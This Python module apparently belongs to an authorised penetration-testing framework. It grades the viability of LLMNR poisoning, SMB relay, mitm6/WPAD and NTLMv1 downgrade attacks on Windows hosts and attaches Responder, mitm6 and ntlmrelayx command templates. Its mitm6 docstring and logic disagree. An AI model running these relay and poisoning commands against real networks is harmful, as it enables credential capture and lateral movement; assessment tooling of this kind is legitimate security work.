"""Windows network-attack surface adjudicator for mitm6/LLMNR/SMB relay.

Contract: pure decisions from observed evidence. The kinetic steps of this
family (poisoning, WPAD MITM, NTLM relay) run on the operator's listening
interface, never on the target, so this module never decides execution:
it grades viability from world-model evidence and returns verdicts with
the exact command templates and the missing-evidence gaps. The loop turns
viable grades into hint nodes; consent stays with the operator.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

SMB_PORT = "445"

KERBEROS_PORT = "88"

LDAP_PORT = "389"

WINDOWS_OS_MARKS: tuple[str, ...] = (
    "windows",
    "win10",
    "win11",
    "winpe",
    "server 20",
    "windows server",
)

WINDOWS_SERVICE_MARKS: tuple[str, ...] = (
    "microsoft-ds",
    "msrpc",
    "netbios",
    "smb",
    "ms-wbt-server",
    "rdp",
)

AD_SERVICE_MARKS: tuple[str, ...] = ("ldap", "kerberos-sec", "globalcat", "3268", "domain")

SIGNING_NOT_REQUIRED_MARKS: tuple[str, ...] = (
    "signing: not required",
    "signing not required",
    "message_signing: disabled",
    "message signing: disabled",
    "message signing disabled",
)

SIGNED_REQUIRED_MARKS: tuple[str, ...] = (
    "signing: required",
    "signing required",
    "message_signing: required",
    "message signing: required",
)

VERDICT_VIABLE = "viable"

VERDICT_NEEDS_EVIDENCE = "needs_evidence"

VERDICT_BLOCKED = "blocked"

VERDICTS: tuple[str, ...] = (VERDICT_VIABLE, VERDICT_NEEDS_EVIDENCE, VERDICT_BLOCKED)

DISCOVERY_COMMANDS: dict[str, tuple[str, ...]] = {
    "smb_signing": (
        "nmap -T4 -p {smb_port} --script smb-security-mode {target}",
        "nxc smb {target} --gen-relay-list {relay_list}",
    ),
    "llmnr_probe": ("responder -I {lhost_if} -A  # passive analysis only, no spoofing",),
    "mitm6_recon": (
        "nmap -6 -T4 -p {ldap_port} {target}",
        "mitm6 -d {domain} -i {lhost_if}  # operator-facing listener",
        "impacket-ntlmrelayx --ipv6 -wh wpad -t ldaps://{dc} -smb2support -l sessions/loot",
    ),
    "relay": (
        "sudo responder -I {lhost_if}  # turn SMB/HTTP servers Off in Responder.conf for relay",
        "impacket-ntlmrelayx -tf {relay_list} -smb2support -socks -dh",
    ),
    "ntlmv1_downgrade": (
        "responder -I {lhost_if} --lm --disable-ess",
        "reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel",
    ),
}


@dataclass(frozen=True)
class AttackVectorVerdict:
    """One family decision with ready-made discovery commands.

    Attributes:
        family: Vector family key (``llmnr``, ``smb_relay``, ``mitm6``...).
        verdict: One of :data:`VERDICTS`.
        targets: Hosts the verdict applies to (empty when blocked).
        reasons: Observed-evidence reasons backing the verdict.
        missing: Evidence the operator must collect first.
        commands: Exact command templates; tokens stay for rendering.
    """

    family: str
    verdict: str
    targets: tuple[str, ...] = ()
    reasons: tuple[str, ...] = ()
    missing: tuple[str, ...] = ()
    commands: tuple[str, ...] = ()

    def as_dict(self) -> dict[str, Any]:
        """Return one JSON-safe view."""
        return {
            "family": self.family,
            "verdict": self.verdict,
            "targets": list(self.targets),
            "reasons": list(self.reasons),
            "missing": list(self.missing),
            "commands": list(self.commands),
        }


@dataclass
class SurfaceEvidence:
    """Evidence bags consumed by :func:`surface_decision`.

    Attributes:
        services: ``{host: {port: {"name": ...}}}`` service map.
        os_hints: ``{host: os string}`` from the world model.
        signing: ``{host: nmap/nxc output}`` for SMB-security-mode evidence.
        lm_compat: ``{host: int level}`` where attested.
    """

    services: dict[str, dict[str, dict[str, Any]]]
    os_hints: dict[str, str]
    signing: dict[str, str]
    lm_compat: dict[str, int]


def _svc_blob(hosts: list[str], evidence: SurfaceEvidence) -> str:
    """Concatenate the service names of the given hosts."""
    bits: list[str] = []
    for host in hosts:
        for entry in evidence.services.get(host, {}).values():
            if isinstance(entry, dict):
                bits.append(str(entry.get("name", "")))
    return " ".join(bits).lower()


def _windows_hosts(evidence: SurfaceEvidence) -> list[str]:
    """Return hosts whose OS hint or services identify Windows."""
    hosts: list[str] = []
    for host in evidence.services:
        hint = str(evidence.os_hints.get(host, "") or "").lower()
        blob = hint
        for entry in evidence.services.get(host, {}).values():
            if isinstance(entry, dict):
                blob += f" {str(entry.get('name', ''))}".lower()
        marked = any(mark in blob for mark in WINDOWS_OS_MARKS) or any(mark in blob for mark in WINDOWS_SERVICE_MARKS)
        if marked:
            hosts.append(host)
    return hosts


def _ad_hosts(evidence: SurfaceEvidence) -> list[str]:
    """Return hosts that present actual directory-identity services."""
    hosts: list[str] = []
    for host in evidence.services:
        blob = " ".join(
            str(value.get("name", "")) for value in evidence.services[host].values() if isinstance(value, dict)
        ).lower()
        if any(mark in blob for mark in AD_SERVICE_MARKS):
            hosts.append(host)
    return hosts


def _signing_not_required(host: str, evidence: SurfaceEvidence) -> bool:
    """Return True when the host has attested SMB signing disabled."""
    blob = str(evidence.signing.get(host, "") or "").lower()
    return any(mark in blob for mark in SIGNING_NOT_REQUIRED_MARKS)


def _downgrade_candidates(evidence: SurfaceEvidence, windows: list[str]) -> list[str]:
    """Return Windows hosts with attested LM compatibility level <= 2."""
    return [host for host in windows if int(evidence.lm_compat.get(host, 5)) <= 2]


def surface_decision(evidence: SurfaceEvidence) -> dict[str, AttackVectorVerdict]:
    """Grade the Windows network-attack families from evidence bags.

    Fail-closed rules:
      - ``llmnr``: viable for Windows hosts with live service identity
        (Windows answers LLMNR by default); blocked without them.
      - ``smb_relay``: viable only for hosts with attested
        signing-not-required; ``needs_evidence`` when an AD host exists but
        signing status is unknown; blocked otherwise.
      - ``mitm6``: ``needs_evidence`` unless an LDAP host exists, then
        viable for the LDAP relay path with the consent gap noted.
      - ``ntlmv1_downgrade``: viable for hosts with LM level <= 2 attested;
        ``needs_evidence`` for Windows hosts without the registry read.

    Args:
        evidence: World-model evidence bags (services, os hints, signing).

    Returns:
        Mapping of family to :class:`AttackVectorVerdict`.
    """
    windows = _windows_hosts(evidence)
    ad = [host for host in windows if _ad_in(evidence, host)]
    relay_ready = [host for host in windows if _signing_not_required(host, evidence)]
    lm_ready = _downgrade_candidates(evidence, windows)
    decisions: dict[str, AttackVectorVerdict] = {}

    if windows:
        decisions["llmnr"] = AttackVectorVerdict(
            family="llmnr",
            verdict=VERDICT_VIABLE,
            targets=tuple(windows[:8]),
            reasons=tuple(f"{host}: windows identity, LLMNR/NBT-NS default on" for host in windows[:4]),
            commands=DISCOVERY_COMMANDS["llmnr_probe"],
        )
    else:
        decisions["llmnr"] = AttackVectorVerdict(
            family="llmnr",
            verdict=VERDICT_BLOCKED,
            reasons=("no Windows-identity host observed",),
        )
    if relay_ready:
        decisions["smb_relay"] = AttackVectorVerdict(
            family="smb_relay",
            verdict=VERDICT_VIABLE,
            targets=tuple(relay_ready[:8]),
            reasons=tuple(f"{host}: attested SMB signing not required" for host in relay_ready[:4]),
            commands=DISCOVERY_COMMANDS["smb_signing"] + DISCOVERY_COMMANDS["relay"],
        )
    elif any(_signing_required(windows, evidence) for windows in windows):
        decisions["smb_relay"] = AttackVectorVerdict(
            family="smb_relay",
            verdict=VERDICT_BLOCKED,
            reasons=tuple(f"{host}: SMB signing required attested" for host in windows[:4]),
        )
    elif windows:
        decisions["smb_relay"] = AttackVectorVerdict(
            family="smb_relay",
            verdict=VERDICT_NEEDS_EVIDENCE,
            targets=tuple(windows[:8]),
            reasons=("Windows hosts observed but SMB signing status unknown",),
            missing=("run the smb-security-mode probe and attest signing-off per host",),
            commands=DISCOVERY_COMMANDS["smb_signing"],
        )
    else:
        decisions["smb_relay"] = AttackVectorVerdict(
            family="smb_relay",
            verdict=VERDICT_BLOCKED,
            reasons=("no Windows host observed to relay into the estate",),
        )
    if ad:
        decisions["mitm6"] = AttackVectorVerdict(
            family="mitm6",
            verdict=VERDICT_NEEDS_EVIDENCE,
            targets=tuple(ad[:8]),
            reasons=("directory identity present; IPv6/WPAD readiness event unobserved",),
            missing=(
                "operator consent and an IPv6/WPAD event (reboot, cable)",
                "mtim6 needs the trial interface reachable at L2",
            ),
            commands=DISCOVERY_COMMANDS["mitm6_recon"],
        )
    else:
        decisions["mitm6"] = AttackVectorVerdict(
            family="mitm6",
            verdict=VERDICT_BLOCKED,
            reasons=("no LDAP/AD host observed",),
        )
    if lm_ready:
        decisions["ntlmv1_downgrade"] = AttackVectorVerdict(
            family="ntlmv1_downgrade",
            verdict=VERDICT_VIABLE,
            targets=tuple(lm_ready[:8]),
            reasons=tuple(f"{host}: LM compatibility level <= 2 attested" for host in lm_ready[:4]),
            commands=DISCOVERY_COMMANDS["ntlmv1_downgrade"],
        )
    elif windows:
        decisions["ntlmv1_downgrade"] = AttackVectorVerdict(
            family="ntlmv1_downgrade",
            verdict=VERDICT_NEEDS_EVIDENCE,
            targets=tuple(windows[:4]),
            reasons=("Windows hosts observed; LmCompatibilityLevel unattested",),
            missing=("read registry LmCompatibilityLevel first",),
            commands=DISCOVERY_COMMANDS["ntlmv1_downgrade"],
        )
    else:
        decisions["ntlmv1_downgrade"] = AttackVectorVerdict(
            family="ntlmv1_downgrade",
            verdict=VERDICT_BLOCKED,
            reasons=("no Windows host observed",),
        )
    return decisions


def _signing_required(host: str, evidence: SurfaceEvidence) -> bool:
    """Return True when the host attested signing required (relay blocked)."""
    blob = str(evidence.signing.get(host, "") or "").lower()
    return any(mark in blob for mark in SIGNED_REQUIRED_MARKS)


def _ad_in(evidence: SurfaceEvidence, host: str) -> bool:
    """Return True when one host carries an AD-identity service."""
    blob = " ".join(
        str(value.get("name", "")) for value in evidence.services.get(host, {}).values() if isinstance(value, dict)
    ).lower()
    return any(mark in blob for mark in AD_SERVICE_MARKS)


def hint_text(verdict: AttackVectorVerdict) -> str:
    """Shape one loop hint line for a verdict.

    Args:
        verdict: Family verdict.

    Returns:
        Bounded operator-facing text for the graph hint node.
    """
    targets = ", ".join(verdict.targets[:3]) or "n/a"
    joined = "; ".join(verdict.reasons[:2] or ("",))
    missing = "; ".join(verdict.missing[:1])
    return f"{verdict.family} [{verdict.verdict}] targets={targets} ({joined[:200]}){(f' missing: {missing[:160]}' if missing else '')}"


__all__ = [
    "DISCOVERY_COMMANDS",
    "AttackVectorVerdict",
    "SurfaceEvidence",
    "VERDICTS",
    "VERDICT_BLOCKED",
    "VERDICT_NEEDS_EVIDENCE",
    "VERDICT_VIABLE",
    "hint_text",
    "surface_decision",
]
